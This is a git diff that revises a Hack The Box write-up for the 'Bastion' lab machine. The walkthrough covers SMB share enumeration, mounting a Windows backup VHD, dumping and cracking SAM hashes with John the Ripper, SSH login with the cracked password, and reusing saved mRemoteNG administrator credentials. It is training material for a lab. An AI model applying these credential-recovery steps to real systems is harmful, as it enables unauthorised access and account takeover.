@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Bastion - Hack The Box
-excerpt: "TBA"
-date: 2019-12-31
+excerpt: "Bastion was an easy box where we had to find an open SMB share that contained a Windows backup. Once we mounted the disk image file, we could recover the system and SAM hive and then crack one of the user's password. An OpenSSH service was installed on the machine so we could SSH in with the credentials and do further enumeration on the box. We then find a mRemoteNG configuration file that contains encrypted credentials for the administrator. The system flag blood was still up for grab when I reached that stage so instead of reversing the encryption for the configuration file I just installed the mRemoteNG application on a Windows VM, copied the config file over and was able to log in as administrator."
+date: 2019-09-07
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-bastion/bastion_logo.png
@@ -10,17 +10,20 @@ categories:
   - hackthebox
   - infosec
 tags:
-  -
+  - windows
+  - mremoteng
+  - backup
+  - smb
 ---
 
 ![](/assets/images/htb-writeup-bastion/bastion_logo.png)
 
-TBA
+Bastion was an easy box where we had to find an open SMB share that contained a Windows backup. Once we mounted the disk image file, we could recover the system and SAM hive and then crack one of the user's password. An OpenSSH service was installed on the machine so we could SSH in with the credentials and do further enumeration on the box. We then find a mRemoteNG configuration file that contains encrypted credentials for the administrator. The system flag blood was still up for grab when I reached that stage so instead of reversing the encryption for the configuration file I just installed the mRemoteNG application on a Windows VM, copied the config file over and was able to log in as administrator.
 
 ## Summary
 
 - An open SMB share contains the full backup of a Windows machine
-- The System and SAM hive can be recovered and then we can crack the `L4mpje` user hash
+- The system and SAM hive can be recovered and then we can crack the `L4mpje` user hash
 - mRemoteNG is installed and the credentials for the administrator are saved in the configuration file
 
 ## Tools used
@@ -29,7 +32,7 @@ TBA
 
 ### Portscan
 
-Interesting: SSH is open on a Windows box, this will probably the way in once we find some credentials.
+OpenSSH is running on the Windows machine. As this is not a standard Windows service, I make note of it as this might be needed to log in later when we find credentials.
 
 ```
 # nmap -sC -sV -p- 10.10.10.134
@@ -64,7 +67,7 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 ### SMB share
 
-There is a SMB that I can Read/Write access to:
+There is a `Backups` SMB share that I have read and write to:
 ```
 # smbmap -u invalid -H 10.10.10.134
 [+] Finding open SMB ports....
@@ -78,7 +81,7 @@ There is a SMB that I can Read/Write access to:
 	IPC$                                              	READ ONLY
 ```
 
-Checking out the `Backups` share, I see an Windows backup directory and a `note.txt`:
+Checking out the `Backups` share, I see a WindowImageBackup backup directory and `note.txt`:
 ```
 smb: \> ls
   .                                   D        0  Sun Apr 28 10:04:03 2019
@@ -90,14 +93,14 @@ smb: \> ls
 		7735807 blocks of size 4096. 2780707 blocks available
 ```
 
-The `note.txt` says we don't need to copy the entire backup file to our VM:
+The `note.txt` says I don't need to copy the entire backup file to our VM:
 ```
 # cat note.txt
 
 Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
 ```
 
-Instead of transferring all the files with smbclient I mounted the remote share:
+Instead of transferring all the files with smbclient I'll just mount the remote share:
 ```
 # mount -t cifs //10.10.10.134/Backups /mnt/bastion
 Password for root@//10.10.10.134/Backups:  *
@@ -108,7 +111,7 @@ total 1
 drwxr-xr-x 2 root root   0 Feb 22 07:44 WindowsImageBackup
 ```
 
-The backup directory contain two `.vhd` files:
+The backup directory contains two `.vhd` files:
 ```
 '/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351':
 total 5330560
@@ -116,9 +119,9 @@ total 5330560
 -rwxr-xr-x 1 root root 5418299392 Feb 22 07:45 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
 ```
 
-I will use the [vhdimount](https://github.com/libyal/libvhdi) utility to mount the remote `.vhd` file to another directory on my system. This way I don't have to download the entire file.
+I use the [vhdimount](https://github.com/libyal/libvhdi) utility to mount the remote `.vhd` file to another directory on my system. This way I don't have to download the entire file.
 
-I just followed the build instructions at [https://github.com/libyal/libvhdi/wiki/Building](https://github.com/libyal/libvhdi/wiki/Building):
+I just follow the build instructions at [https://github.com/libyal/libvhdi/wiki/Building](https://github.com/libyal/libvhdi/wiki/Building):
 
 1. `apt install autoconf automake autopoint libtool pkg-config`
 2. `./synclibs.sh`
@@ -134,14 +137,14 @@ I can now mount the remote image:
 vhdimount 20190309
 ```
 
-It mounted a single file and not the actual contents:
+It mounts a single file and not the actual contents:
 ```
 # ls -l
 total 0
 -r--r--r-- 1 root root 15999492096 Apr 28 10:19 vhdi1
 ```
 
-I used the `mmls` utility to display the partition layout and calculate the offset of the partition: Block size x Start -> 512 * 128 = 65536
+I then use the `mmls` utility to display the partition layout and calculate the offset of the partition: Block size x Start -> 512 * 128 = 65536
 ```
 # mmls -aB vhdi1
 DOS Partition Table
@@ -152,7 +155,7 @@ Units are in 512-byte sectors
 002:  000:000   0000000128   0031248511   0031248384   0014G   NTFS / exFAT (0x07)
 ```
 
-Then I mounted the image to another directory, specifying the proper offset:
+Then I mount the image to another directory, specifying the proper offset:
 ```
 # mount -o ro,noload,offset=65536 vhdi1 /mnt/bastion_backup
 root@ragingunicorn:/mnt/vhd# ls -l /mnt/bastion_backup/
@@ -179,7 +182,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 ```
 
-With John The Ripper I can quickly find the password for user `L4mpje`: `bureaulampje`
+With John The Ripper I can crack the hash for user `L4mpje`: `bureaulampje`
 ```
 # john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt
 Using default input encoding: UTF-8
@@ -190,7 +193,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 bureaulampje     (L4mpje)
 ```
 
-I can now SSH in and get the user flag:
+With that account I can SSH in and get the user flag:
 ```
 # ssh l4mpje@10.10.10.134
 l4mpje@10.10.10.134's password:
@@ -216,13 +219,13 @@ l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
 9bfe57...
 ```
 
-### Priv esc method used when box was launched
+### Getting the administrator credentials
 
-I did some initial recon and found the mRemoteNG application is installed on the system. mRemoteNG is a multi-protocol connection manager and allows users to connect to systems with different protocols like SSH, RDP, VNC, etc. As such, it supports saving the credentials locally in a configuration file.
+I do some recon and found the mRemoteNG application is installed on the system. mRemoteNG is a multi-protocol connection manager and allows users to connect to systems with different protocols like SSH, RDP, VNC, etc. As such, it supports saving the credentials locally in a configuration file.
 
 The XML configuration file is located here: `C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml`
 
-I immediately saw that it contains an RDP session configuration for user `Administrator`:
+I immediately see that it contains an RDP session configuration for user `Administrator`:
 ```
 <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General"
 Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain=""
@@ -259,10 +262,6 @@ I installed mRemoteNG portable edition then replaced the `confCons.xml` with the
 
 ![](/assets/images/htb-writeup-bastion/mremoteng1.png)
 
-I can connect with the credentials and get the system flag:
+I can connect with the administrator credentials and get the system flag:
 
 ![](/assets/images/htb-writeup-bastion/mremoteng2.png)
-
-### Priv esc method by manually decrypting the password:
-
-** To be added **
